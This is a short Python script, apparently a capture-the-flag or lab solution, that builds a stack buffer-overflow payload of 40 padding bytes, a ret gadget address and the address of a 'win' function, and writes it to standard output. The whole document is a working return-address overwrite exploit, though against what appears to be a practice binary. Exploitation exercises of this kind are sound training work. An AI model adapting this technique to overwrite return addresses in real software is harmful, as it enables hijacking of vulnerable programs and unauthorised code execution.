import struct
import sys

# Padding
padding = b'A' * 40

ret_gadget = struct.pack('<Q', 0x401260)

# The Win Address
win_address = struct.pack('<Q', 0x401238) 

# New Payload: Padding + Ret + Win
payload = padding + ret_gadget + win_address

sys.stdout.buffer.write(payload)